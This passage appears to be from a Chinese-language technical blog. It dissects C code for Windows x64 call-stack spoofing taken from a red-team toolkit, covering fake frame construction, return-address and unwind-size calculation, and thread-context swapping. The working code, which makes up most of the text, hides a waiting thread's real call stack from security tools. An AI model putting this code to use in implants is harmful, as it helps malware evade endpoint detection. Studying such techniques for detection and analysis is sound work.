<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hEvent</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
</pre></div>
<h4 data-content="1" id="9829ab5afb7188286a053127ce9c0ff8">spoof_stack：入口</h4>
<p>传入的<code>threadId</code>是<code>GetCurrentThreadId</code>获取的当前线程ID</p>
<div class="highlight"><pre><span></span><span class="cp">#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)</span>
<span class="cp">#define RVA(type, base_addr, rva) (type)(ULONG_PTR)((ULONG_PTR) base_addr + rva)</span>

<span class="cp">#define MAX_FRAME_NUM 10</span>
<span class="cp">#define RBP_OP_INFO 0x5</span>
<span class="p">......</span>
<span class="n">CONTEXT</span> <span class="n">context</span> <span class="o">=</span> <span class="p">{};</span>
<span class="n">PSTACK_FRAME</span> <span class="n">gcallstack</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">number_of_frames</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">spoof_stack</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="n">threadId</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">CONTEXT</span> <span class="n">context2</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="cm">/* Initialize the information once */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">gcallstack</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// HeapAlloc分配内存，分配十个堆栈帧</span>
        <span class="n">gcallstack</span> <span class="o">=</span> <span class="n">intAlloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">STACK_FRAME</span><span class="p">)</span> <span class="o">*</span> <span class="n">MAX_FRAME_NUM</span><span class="p">);</span>

        <span class="c1">// 初始化伪造的栈帧</span>
        <span class="n">set_callstack</span><span class="p">(</span><span class="n">gcallstack</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">number_of_frames</span><span class="p">);</span>
        <span class="n">initialize_spoofed_callstack</span><span class="p">(</span><span class="n">gcallstack</span><span class="p">,</span> <span class="n">number_of_frames</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// 打开当前线程</span>
    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="n">threadId</span><span class="p">);</span>
    <span class="c1">// 存放当前线程上下文到context，并复制到context2</span>
    <span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
    <span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">context2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CONTEXT</span><span class="p">));</span>
    <span class="c1">// 初始化伪造的栈帧</span>
    <span class="n">initialize_fake_thread_state</span><span class="p">(</span><span class="n">gcallstack</span><span class="p">,</span> <span class="n">number_of_frames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context2</span><span class="p">);</span>
    <span class="c1">// 设置当前线程的上下文为伪造栈帧上下文</span>
    <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context2</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>代码中的PSTACK_FRAME存放了每个栈帧的详细信息，比如目标DLL名称、函数哈希、偏移量、返回地址等等</p>
<div class="highlight"><pre><span></span><span class="cm">/*</span>
<span class="cm"> * Used to store information for individual stack frames for call stack to spoof.</span>
<span class="cm"> */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_STACK_FRAME</span> <span class="p">{</span>
    <span class="n">WCHAR</span> <span class="n">targetDll</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
    <span class="n">DWORD</span> <span class="n">functionHash</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">totalStackSize</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">requiresLoadLibrary</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">setsFramePointer</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">returnAddress</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">pushRbp</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">countOfCodes</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">pushRbpIndex</span><span class="p">;</span>
<span class="p">}</span> <span class="n">STACK_FRAME</span><span class="p">,</span> <span class="o">*</span><span class="n">PSTACK_FRAME</span><span class="p">;</span>
</pre></div>
<h4 data-content="1" id="67a67712f57803fe55ee64d0d002aef9">set_callstack：构造伪造栈帧</h4>
<p>跟进set_callstack，利用</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">set_callstack</span><span class="p">(</span>
    <span class="n">IN</span> <span class="n">PSTACK_FRAME</span> <span class="n">callstack</span><span class="p">,</span>
    <span class="n">OUT</span> <span class="n">PDWORD</span> <span class="n">number_of_frames</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">     *  How to choose your call stack to spoof.</span>
<span class="cm">     *  Steps:</span>
<span class="cm">     *  1. 在代表性的 Windows 目标系统上使用 Process Hacker 或类似实用程序，找到您想要伪装的调用堆栈。</span>
<span class="cm">     *     注意：不同版本的 Windows 可能具有不同的偏移量。</span>
<span class="cm">     *  2. 使用模块、函数和偏移信息作为输入，使用位于arsenal-kit/utils中的getFunctionOffset实用程序。</span>
<span class="cm">     *  3. getFunctionOffset实用程序输出包括在此函数中使用的代码在内的信息。 </span>
<span class="cm">     *     注意：应该查找顶部为NtWaitForSingleObject的调用堆栈。然后使用剩余调用堆栈帧的信息。 </span>
<span class="cm">     *     注意：模块扩展名是可选的。</span>
<span class="cm">     *  Note: Should look for a stack with NtWaitForSingleObject at the top.</span>
<span class="cm">     *        Then use the information for the remaining stack frames.</span>
<span class="cm">     *  Note: The module extension is optional.</span>
<span class="cm">     *</span>
<span class="cm">     *  使用getFunctionOffset帮助程序，来获取dll中函数的偏移值</span>
<span class="cm">     *     getFunctionOffset.exe ntdll.dll TpReleasePool 0x402</span>
<span class="cm">     *     getFunctionOffset.exe kernel32.dll BaseThreadInitThunk 0x14</span>
<span class="cm">     *     getFunctionOffset.exe ntdll RtlUserThreadStart 0x21</span>
<span class="cm">     *</span>
<span class="cm">     *  Note: The number of frames can not exceed the MAX_FRAME_NUM value.</span>
<span class="cm">     */</span>
    <span class="n">set_frame_info</span><span class="p">(</span><span class="o">&amp;</span><span class="n">callstack</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">],</span> <span class="sa">L</span><span class="s">"ntdll.dll"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x550b2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
    <span class="n">set_frame_info</span><span class="p">(</span><span class="o">&amp;</span><span class="n">callstack</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">],</span> <span class="sa">L</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x174b4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
    <span class="n">set_frame_info</span><span class="p">(</span><span class="o">&amp;</span><span class="n">callstack</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">],</span> <span class="sa">L</span><span class="s">"ntdll"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x526a1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>

    <span class="o">*</span><span class="n">number_of_frames</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>通过自实现的set_frame_info，直接操作栈帧结构体，为一些关键结构体赋值，值为传入的参数</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">set_frame_info</span><span class="p">(</span>
    <span class="n">OUT</span> <span class="n">PSTACK_FRAME</span> <span class="n">frame</span><span class="p">,</span>          <span class="c1">// 出参，指向STACK_FRAME结构体的指针</span>
    <span class="n">IN</span> <span class="n">LPWSTR</span> <span class="n">path</span><span class="p">,</span>                  <span class="c1">// 入参，目标DLL的路径</span>
    <span class="n">IN</span> <span class="n">DWORD</span> <span class="n">api_hash</span><span class="p">,</span>               <span class="c1">// 入参，API的哈希值</span>
    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">target_offset</span><span class="p">,</span>          <span class="c1">// 入参，目标函数在DLL中的偏移量</span>
    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">target_stack_size</span><span class="p">,</span>      <span class="c1">// 入参，目标函数栈大小</span>
    <span class="n">IN</span> <span class="n">BOOL</span> <span class="n">dll_load</span><span class="p">)</span>                <span class="c1">// 入参，是否需要加载DLL</span>
<span class="p">{</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STACK_FRAME</span><span class="p">));</span> <span class="c1">// 初始化STACK_FRAME结构体为0</span>
    <span class="n">lstrcpyW</span><span class="p">(</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">targetDll</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>      <span class="c1">// 设置目标DLL路径</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">functionHash</span> <span class="o">=</span> <span class="n">api_hash</span><span class="p">;</span>        <span class="c1">// 设置API哈希值</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="n">target_offset</span><span class="p">;</span>         <span class="c1">// 设置目标函数偏移量</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">totalStackSize</span> <span class="o">=</span> <span class="n">target_stack_size</span><span class="p">;</span> <span class="c1">// 设置目标函数栈大小</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">requiresLoadLibrary</span> <span class="o">=</span> <span class="n">dll_load</span><span class="p">;</span> <span class="c1">// 设置是否需要加载DLL</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">setsFramePointer</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>       <span class="c1">// 设置是否设置帧指针（通常用于调试）</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">returnAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>              <span class="c1">// 设置返回地址为0（通常在后续操作中修改）</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">pushRbp</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>                <span class="c1">// 设置是否推送基指针寄存器（RBP）到栈上</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">countOfCodes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>               <span class="c1">// 设置代码数量为0（用于后续的代码注入或修改）</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">pushRbpIndex</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>               <span class="c1">// 设置推送RBP指令的索引为0（用于后续操作）</span>
<span class="p">}</span>
</pre></div>
<h4 data-content="1" id="2371405362119a0853274c82194c758e">initialize_spoofed_callstack：初始化伪造栈帧</h4>
<p>对栈帧的大小和返回地址进行计算，如果分配的栈帧计算出现问题，就不继续初始化了</p>
<div class="highlight"><pre><span></span><span class="cm">/*</span>
<span class="cm"> * Takes a target call stack and configures it ready for use</span>
<span class="cm"> * via loading any required dlls, resolving module addresses</span>
<span class="cm"> * and calculating spoofed return addresses.</span>
<span class="cm"> */</span>
<span class="n">BOOL</span> <span class="nf">initialize_spoofed_callstack</span><span class="p">(</span>
    <span class="n">PSTACK_FRAME</span> <span class="n">callstack</span><span class="p">,</span>
    <span class="n">DWORD</span> <span class="n">number_of_frames</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PSTACK_FRAME</span> <span class="n">frame</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="c1">// 遍历传入的栈帧</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">number_of_frames</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">frame</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">callstack</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

        <span class="c1">// [1] Calculate ret address for current stack frame.</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">calculate_return_address</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// [2] Calculate the total stack size for ret function.</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">calculate_function_stack_size</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>calculate_return_address的作用是，设置栈帧返回地址为dll的image_base + 传入的offset，即指定函数的RVA</p>
<div class="highlight"><pre><span></span><span class="n">BOOL</span> <span class="nf">calculate_return_address</span><span class="p">(</span>
    <span class="n">IN</span> <span class="n">OUT</span> <span class="n">PSTACK_FRAME</span> <span class="n">frame</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PVOID</span> <span class="n">image_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// get library base address</span>
    <span class="n">image_base</span> <span class="o">=</span> <span class="n">GetModuleHandleW</span><span class="p">(</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">targetDll</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">image_base</span><span class="p">)</span>
        <span class="n">image_base</span> <span class="o">=</span> <span class="n">LoadLibraryW</span><span class="p">(</span><span class="n">frame</span><span class="o">-&gt;</span><span class="n">targetDll</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">image_base</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// set the return address as image_base + offset</span>
    <span class="n">frame</span><span class="o">-&gt;</span><span class="n">returnAddress</span> <span class="o">=</span> <span class="n">RVA</span><span class="p">(</span><span class="n">PVOID</span><span class="p">,</span> <span class="n">image_base</span><span class="p">,</span> <span class="n">frame</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>接下来是计算构造出的伪造调用栈的总空间占用量，这对于伪造的堆栈在解除堆栈的过程中能够正确执行很重要，以免导致程序崩溃或检测到异常行为<br/>
<strong>calculate_function_stack_size_internal函数</strong>：</p>
<ul>
<li>这个函数计算伪造栈帧使用的总栈空间。它使用<strong>RtlVirtualUnwind</strong>的简化实现来解析目标函数的展开代码，并累加总栈大小。</li>
<li>函数遍历展开信息，根据不同的展开操作来计算栈空间使用量。例如，<strong>UWOP_PUSH_NONVOL</strong>操作会增加8字节的栈空间，而<strong>UWOP_ALLOC_LARGE</strong>操作则根据操作信息来计算大块内存分配的大小。</li>
<li>如果存在链式展开信息（<strong>UNW_FLAG_CHAININFO</strong>），函数将递归地解析这些信息并添加到总栈大小中。</li>
<li>最后，函数会将返回地址的大小（通常为8字节）添加到总栈大小中。<br/>
#### initialize_fake_thread_state：最终实现<br/>
这里首先要明确windows x64调用规定的堆栈结构<br/>
标准的传统的rbp为基址的栈结构如下（自上而下），但是也有可能不使用rbp而是直接用rsp进行堆栈查找，这取决于编译器的优化策略<br/>
所以以下栈帧的伪造，需要判定<code>STACK_FRAME.setsFramePointer</code>是否设置，如果设置了就要使用rbp，否则直接构造rip</li>
</ul>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">initialize_fake_thread_state</span><span class="p">(</span>
    <span class="n">PSTACK_FRAME</span> <span class="n">callstack</span><span class="p">,</span> <span class="c1">// 假调用栈的数组</span>
    <span class="n">DWORD</span> <span class="n">number_of_frames</span><span class="p">,</span> <span class="c1">// 调用栈中帧的数量</span>
    <span class="n">PCONTEXT</span> <span class="n">context</span><span class="p">)</span>       <span class="c1">// 当前线程的上下文信息</span>
<span class="p">{</span>
    <span class="n">ULONG64</span> <span class="n">childSp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// 子函数的堆栈指针</span>
    <span class="n">BOOL</span> <span class="n">bPreviousFrameSetUWOP_SET_FPREG</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span> <span class="c1">// 上一个帧是否设置了帧指针</span>
    <span class="n">PSTACK_FRAME</span> <span class="n">stackFrame</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// 用于遍历调用栈的指针</span>

    <span class="c1">// 作为额外的安全检查，显式清除最后的RET地址，以停止进一步的展开。</span>
    <span class="n">push_to_stack</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 在堆栈上推入一个0值，作为哨兵值</span>

    <span class="c1">// 从目标调用栈的*后面*开始循环，</span>
    <span class="c1">// 并修改堆栈，使其类似于假的调用栈</span>
    <span class="c1">//      |                |</span>
    <span class="c1">//       ----------------</span>
    <span class="c1">//      |  RET ADDRESS   |</span>
    <span class="c1">//       ----------------</span>
    <span class="c1">//      |                |</span>
    <span class="c1">//      |     Unwind     |</span>
    <span class="c1">//      |     Stack      |</span>
    <span class="c1">//      |      Size      |</span>
    <span class="c1">//      |                |</span>
    <span class="c1">//       ----------------</span>
    <span class="c1">//      |  RET ADDRESS   |</span>
    <span class="c1">//       ----------------</span>
    <span class="c1">//      |                |</span>
    <span class="c1">//      |     Unwind     |</span>
    <span class="c1">//      |     Stack      |</span>
    <span class="c1">//      |      Size      |</span>
    <span class="c1">//      |                |</span>
    <span class="c1">//       ----------------</span>
    <span class="c1">//      |   RET ADDRESS  |</span>
    <span class="c1">//       ----------------   &lt;--- RSP when NtOpenProcess is called</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">number_of_frames</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">stackFrame</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">callstack</span><span class="p">[</span><span class="n">number_of_frames</span> <span class="o">-</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span> <span class="c1">// 从最后一个帧开始遍历</span>

        <span class="c1">// [2.1] 检查上一个帧是否设置了UWOP_SET_FPREG。</span>
        <span class="c1">// 如果上一个帧使用了UWOP_SET_FPREG操作，它将会将栈指针重置为rbp。</span>
        <span class="c1">// 因此，我们需要找到链中的下一个函数，它会push rbp并确保它将正确的值写入栈，以便传播到需要该值的后续帧（否则堆栈回溯将失败）。</span>
        <span class="c1">// 所需的值是使用了UWOP_SET_FPREG的函数的childSP（即在调整栈并推入RET地址之前，RSP的值）。</span>
        <span class="c1">// P.S. 程序崩溃/出错的栈帧末尾位置</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bPreviousFrameSetUWOP_SET_FPREG</span> <span class="o">&amp;&amp;</span> <span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">pushRbp</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// [2.2] 检查在函数前言中将RBP push到栈上的时机。UWOP_PUSH_NONVOL将始终是最后一个：</span>
            <span class="c1">// "由于对epilog的约束，UWOP_PUSH_NONVOL展开代码必须首先出现在前言中，相应地，在展开代码数组中出现最后。"</span>
            <span class="c1">// 因此，将推送rbp的代码索引从总数中减去以确定它何时被推送到栈上。</span>
            <span class="c1">// 例如，如果差值为1，则rsp -= 0x8，然后写入childSP：</span>
            <span class="c1">// RPCRT4!LrpcIoComplete:</span>
            <span class="c1">// 00007ffd`b342b480 4053            push    rbx</span>
            <span class="c1">// 00007ffd`b342b482 55              push    rbp</span>
            <span class="c1">// 00007ffd`b342b483 56              push    rsi</span>
            <span class="c1">// 如果diff为0，则首先push rbp</span>
            <span class="n">DWORD</span> <span class="n">diff</span> <span class="o">=</span> <span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">countOfCodes</span> <span class="o">-</span> <span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">pushRbpIndex</span><span class="p">;</span>
            <span class="n">DWORD</span> <span class="n">tmpStackSizeCounter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">diff</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="c1">// e.g. push rbx</span>
                <span class="n">push_to_stack</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span> <span class="c1">// 目的只在伪造栈帧，具体的命令无所谓</span>
                <span class="n">tmpStackSizeCounter</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">;</span> <span class="c1">// 计算已推入堆栈的大小</span>
            <span class="p">}</span>
            <span class="c1">// push rbp</span>
            <span class="n">push_to_stack</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">childSp</span><span class="p">);</span> <span class="c1">// 推入子函数的堆栈指针</span>

            <span class="c1">// 减去剩余的函数堆栈大小，并继续展开</span>
            <span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="p">(</span><span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">totalStackSize</span> <span class="o">-</span> <span class="p">(</span><span class="n">tmpStackSizeCounter</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">));</span>
            <span class="o">*</span><span class="p">(</span><span class="n">PULONG64</span><span class="p">)(</span><span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">returnAddress</span><span class="p">;</span> <span class="c1">// 写入返回地址</span>

            <span class="n">bPreviousFrameSetUWOP_SET_FPREG</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span> <span class="c1">// 重置帧指针设置标志</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="c1">// 直接构造rsp栈结构</span>
            <span class="c1">// 如果是正常帧，减少总堆栈大小并写入RET地址</span>
            <span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">totalStackSize</span><span class="p">;</span>
            <span class="o">*</span><span class="p">(</span><span class="n">PULONG64</span><span class="p">)(</span><span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">returnAddress</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// 检查当前函数是否在展开时设置了帧指针</span>
        <span class="c1">// 此刻已经是下一个栈的rbp了</span>
        <span class="c1">// 保存此刻sp，方便下一个调用栈push rbp</span>
        <span class="c1">// 模拟push rbp前指针状态</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">stackFrame</span><span class="o">-&gt;</span><span class="n">setsFramePointer</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">childSp</span> <span class="o">=</span> <span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span><span class="p">;</span> <span class="c1">// 保存当前函数调用栈起始sp</span>
            <span class="n">childSp</span> <span class="o">+=</span> <span class="mh">0x8</span><span class="p">;</span> <span class="c1">// 上拉一格，因为push_to_stack会下拉一格</span>
            <span class="n">bPreviousFrameSetUWOP_SET_FPREG</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span> <span class="c1">// 设置帧指针设置标志</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> *  Pushes a value to the stack of a Context structure.</span>
<span class="cm"> */</span>
<span class="kt">void</span> <span class="nf">push_to_stack</span><span class="p">(</span>
    <span class="n">PCONTEXT</span> <span class="n">context</span><span class="p">,</span>
    <span class="n">ULONG64</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span> <span class="o">-=</span> <span class="mh">0x8</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">PULONG64</span><span class="p">)(</span><span class="n">context</span><span class="o">-&gt;</span><span class="n">Rsp</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>详情堆栈变化可以参考如下<br/>
假设初始堆栈状态如下：</p>
<div class="highlight"><pre><span></span><span class="o">+-------------------+</span>
<span class="o">|</span>   <span class="err">哨兵值</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>    <span class="o">|</span> <span class="o">&lt;-</span> <span class="n">RSP</span>
<span class="o">+-------------------+</span>
</pre></div>
<p>当 setsFramePointer 为真时，函数会模拟push rbp,mov rsp rbp的平栈操作，将rsp设置为</p>
<div class="highlight"><pre><span></span><span class="o">+-------------------+</span>
<span class="o">|</span>   <span class="err">哨兵值</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>    <span class="o">|</span> <span class="o">&lt;-</span> <span class="n">RSP</span>
<span class="o">+-------------------+</span>
<span class="o">|</span>   <span class="err">返回地址</span>        <span class="o">|</span>
<span class="o">+-------------------+</span>
<span class="o">|</span>   <span class="err">旧的</span> <span class="n">rbp</span> <span class="err">值</span>     <span class="o">|</span> <span class="o">&lt;-</span> <span class="n">rbp</span>
<span class="o">+-------------------+</span>
<span class="o">|</span>   <span class="err">函数的局部变量</span>  <span class="o">|</span>
<span class="o">+-------------------+</span>
</pre></div>
<p>在Windows系统中，当程序运行出错或者发生异常时，系统需要找到问题发生的原因，并且控制程序的执行流程。为了做到这一点，系统会使用一种叫做“堆栈展开”的过程来追踪程序的调用栈——也就是函数调用的历史记录。<br/>
<strong>堆栈展开</strong>是一个逆向过程，它从出错的点开始，一步步回溯到之前的函数调用，就像是倒着走你之前走过的路一样。这个过程需要用到一些特殊的操作码，比如<strong>UWOP_SET_FPREG</strong>和<strong>UWOP_PUSH_NONVOL</strong>。</p>
<ul>
<li>
<strong>UWOP_SET_FPREG</strong>是一个操作码，它告诉系统如何通过帧指针（通常是<strong>rbp</strong>寄存器）来找到上一个函数的堆栈帧。简单来说，就是它用来标记“从这里开始，往回走可以找到上一个函数的信息”。</li>
<li>
<strong>UWOP_PUSH_NONVOL</strong>是另一个操作码，它描述了函数在开始执行时如何保存那些在函数调用过程中不应该被改变的寄存器值（非易失性寄存器），以便函数执行完毕后能够恢复它们。</li>
</ul>
<p>这段代码的目的是创建一个假的调用栈。它通过模拟正常的函数调用和堆栈展开过程中的操作，构造出一个看起来像是由真实函数调用产生的堆栈。这样做的目的可能是为了在进行逆向工程时隐藏真实的调用栈，或者在分析恶意软件时模拟某些行为。<br/>
代码中的<strong>initialize_fake_thread_state</strong>函数就是用来初始化这样一个假的调用栈。它接收一个调用栈数组、帧的数量和当前线程的上下文信息作为参数。然后，它通过修改当前线程的堆栈上下文，来构造出一个假的调用栈。</p>
<h4 data-content="1" id="9d80a3f261aab89f822dd9a9277d5857">restore_stack：复原栈帧</h4>
<p>Context是之前提取的原上下文，现在恢复原线程的栈帧</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">restore_stack</span><span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="n">threadId</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="n">threadId</span><span class="p">);</span>
    <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
